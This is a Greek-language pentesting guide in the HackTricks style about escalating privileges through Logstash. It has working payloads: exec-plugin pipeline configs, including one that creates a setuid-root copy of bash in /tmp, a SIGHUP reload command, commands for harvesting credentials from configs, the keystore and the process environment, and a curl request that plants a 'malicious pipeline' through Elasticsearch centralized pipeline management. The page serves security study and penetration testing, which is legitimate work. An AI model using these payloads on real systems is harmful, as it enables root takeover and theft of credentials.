# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash χρησιμοποιείται για να **συλλέγει, μετασχηματίζει και προωθεί αρχεία καταγραφής** μέσω ενός συστήματος γνωστού ως **pipelines**. Αυτά τα **pipelines** αποτελούνται από στάδια **input**, **filter**, και **output**. Ανακύπτει ένα ενδιαφέρον σημείο όταν το Logstash λειτουργεί σε μια συμβιβασμένη μηχανή.

### Pipeline Configuration

Pipelines διαμορφώνονται στο αρχείο **/etc/logstash/pipelines.yml**, το οποίο παραθέτει τις τοποθεσίες των ρυθμίσεων των pipelines:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Αυτό το αρχείο αποκαλύπτει πού βρίσκονται τα αρχεία **.conf** που περιέχουν τις ρυθμίσεις pipeline. Όταν χρησιμοποιείται ένα **Elasticsearch output module**, είναι συνηθισμένο οι **pipelines** να περιέχουν **Elasticsearch credentials**, τα οποία συχνά διαθέτουν εκτεταμένα προνόμια λόγω της ανάγκης του Logstash να γράφει δεδομένα στο Elasticsearch. Οι wildcards σε μονοπάτια ρυθμίσεων επιτρέπουν στο Logstash να εκτελεί όλες τις ταιριαστές pipelines στον καθορισμένο κατάλογο.

Αν το Logstash ξεκινήσει με `-f <directory>` αντί για `pipelines.yml`, **όλα τα αρχεία μέσα σε αυτόν τον κατάλογο συνενώνονται με λεξικογραφική σειρά και αναλύονται ως μία ενιαία διαμόρφωση**. Αυτό δημιουργεί 2 επιθετικές επιπτώσεις:

- Ένα αρχείο που τοποθετείται (π.χ. `000-input.conf` ή `zzz-output.conf`) μπορεί να αλλάξει τον τρόπο συναρμολόγησης της τελικής pipeline
- Ένα μη έγκυρο/χαλασμένο αρχείο μπορεί να αποτρέψει τη φόρτωση ολόκληρης της pipeline, οπότε επικυρώστε προσεκτικά τα payloads πριν βασιστείτε στο auto-reload

### Γρήγορη απογραφή σε συμβιβασμένο σύστημα

Σε ένα σύστημα όπου είναι εγκατεστημένο το Logstash, ελέγξτε γρήγορα:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Ελέγξτε επίσης αν το local monitoring API είναι προσβάσιμο. Από προεπιλογή δεσμεύεται στη **127.0.0.1:9600**, κάτι που συνήθως αρκεί μετά το landing στον host:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Αυτό συνήθως σας δίνει τα pipeline IDs, λεπτομέρειες runtime και επιβεβαίωση ότι το τροποποιημένο pipeline σας έχει φορτωθεί.

Διαπιστευτήρια που ανακτώνται από το Logstash συνήθως ξεκλειδώνουν το **Elasticsearch**, οπότε ελέγξτε [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Για να επιχειρήσετε privilege escalation, πρώτα εντοπίστε τον χρήστη υπό τον οποίο τρέχει η υπηρεσία Logstash, συνήθως τον χρήστη **logstash**. Βεβαιωθείτε ότι πληροίτε **ένα** από τα παρακάτω κριτήρια:

- Έχετε **write access** σε ένα pipeline **.conf** αρχείο **ή**
- Το αρχείο **/etc/logstash/pipelines.yml** χρησιμοποιεί wildcard, και μπορείτε να γράψετε στον φάκελο προορισμού

Επιπλέον, **μία** από αυτές τις συνθήκες πρέπει να ικανοποιείται:

- Δυνατότητα επανεκκίνησης της υπηρεσίας Logstash **ή**
- Το αρχείο **/etc/logstash/logstash.yml** έχει ρυθμισμένο το **config.reload.automatic: true**

Εφόσον υπάρχει wildcard στη διαμόρφωση, η δημιουργία ενός αρχείου που ταιριάζει με αυτό επιτρέπει την εκτέλεση εντολών. Για παράδειγμα:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Εδώ, το **interval** καθορίζει τη συχνότητα εκτέλεσης σε δευτερόλεπτα. Στο παράδειγμα, η εντολή **whoami** εκτελείται κάθε 120 δευτερόλεπτα, με την έξοδό της να κατευθύνεται στο **/tmp/output.log**.

Με **config.reload.automatic: true** στο **/etc/logstash/logstash.yml**, το Logstash θα εντοπίζει και θα εφαρμόζει αυτόματα νέες ή τροποποιημένες ρυθμίσεις pipeline χωρίς να απαιτείται επανεκκίνηση. Αν δεν υπάρχει wildcard, μπορούν ακόμη να γίνουν τροποποιήσεις στις υπάρχουσες ρυθμίσεις, αλλά συνιστάται προσοχή για να αποφευχθούν διακοπές.

### Πιο αξιόπιστα Pipeline Payloads

Το `exec` input plugin εξακολουθεί να λειτουργεί στις τρέχουσες εκδόσεις και απαιτεί είτε `interval` είτε `schedule`. Εκτελείται μέσω **forking** της Logstash JVM, οπότε αν η μνήμη είναι περιορισμένη το payload σας ενδέχεται να αποτύχει με `ENOMEM` αντί να τρέξει σιωπηλά.

Ένα πιο πρακτικό privilege-escalation payload είναι συνήθως αυτό που αφήνει ένα ανθεκτικό artifact:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Αν δεν έχετε δικαιώματα επανεκκίνησης αλλά μπορείτε να στείλετε σήμα στη διεργασία, το Logstash υποστηρίζει επίσης ανανέωση ενεργοποιούμενη από **SIGHUP** σε συστήματα Unix-like:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Να έχετε υπόψη ότι δεν είναι όλα τα plugin φιλικά προς την επαναφόρτωση. Για παράδειγμα, το input **stdin** αποτρέπει την αυτόματη επαναφόρτωση, οπότε μην υποθέτετε ότι το `config.reload.automatic` θα εντοπίσει πάντα τις αλλαγές σας.

### Κλοπή μυστικών από το Logstash

Προτού επικεντρωθείτε αποκλειστικά στην εκτέλεση κώδικα, συλλέξτε τα δεδομένα στα οποία το Logstash έχει ήδη πρόσβαση:

- Τα plaintext credentials συχνά είναι hardcoded μέσα σε `elasticsearch {}` outputs, `http_poller`, JDBC inputs ή ρυθμίσεις σχετικές με cloud
- Secure settings μπορεί να βρίσκονται στο **`/etc/logstash/logstash.keystore`** ή σε κάποιον άλλο κατάλογο `path.settings`
- Το keystore password συχνά παρέχεται μέσω του **`LOGSTASH_KEYSTORE_PASS`**, και οι εγκαταστάσεις με πακέτα συνήθως το προμηθεύονται από **`/etc/sysconfig/logstash`**
- Η επέκταση μεταβλητών περιβάλλοντος με `${VAR}` επιλύεται κατά την εκκίνηση του Logstash, οπότε αξίζει να εξετάσετε το περιβάλλον της υπηρεσίας

Χρήσιμοι έλεγχοι:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Αξίζει επίσης να το ελέγξετε γιατί **CVE-2023-46672** έδειξε ότι Logstash μπορούσε να καταγράψει ευαίσθητες πληροφορίες στα logs υπό συγκεκριμένες συνθήκες. Σε έναν post-exploitation host, παλιά Logstash logs και καταχωρήσεις του `journald` μπορούν επομένως να αποκαλύψουν credentials ακόμη και αν η τρέχουσα config αναφέρεται στο keystore αντί να αποθηκεύει secrets inline.

### Κατάχρηση Κεντρικής Διαχείρισης Pipeline

Σε ορισμένα περιβάλλοντα, ο host δεν βασίζεται καθόλου σε τοπικά `.conf` αρχεία. Αν έχει ρυθμιστεί **`xpack.management.enabled: true`**, το Logstash μπορεί να τραβήξει κεντρικά διαχειριζόμενα pipelines από Elasticsearch/Kibana, και μετά την ενεργοποίηση αυτού του mode οι τοπικές pipeline configs δεν είναι πλέον η πηγή αλήθειας.

Αυτό σημαίνει διαφορετικό μονοπάτι επίθεσης:

1. Ανάκτηση Elastic credentials από τοπικές ρυθμίσεις Logstash, το keystore, ή logs
2. Επαλήθευση αν ο λογαριασμός έχει το cluster privilege **`manage_logstash_pipelines`**
3. Δημιουργία ή αντικατάσταση ενός κεντρικά διαχειριζόμενου pipeline ώστε ο Logstash host να εκτελέσει το payload σας στο επόμενο poll interval

Το Elasticsearch API που χρησιμοποιείται για αυτή τη λειτουργία είναι:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Αυτό είναι ιδιαίτερα χρήσιμο όταν τα τοπικά αρχεία είναι μόνο για ανάγνωση αλλά το Logstash έχει ήδη καταχωρηθεί για να ανακτά pipelines απομακρυσμένα.

## Αναφορές

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
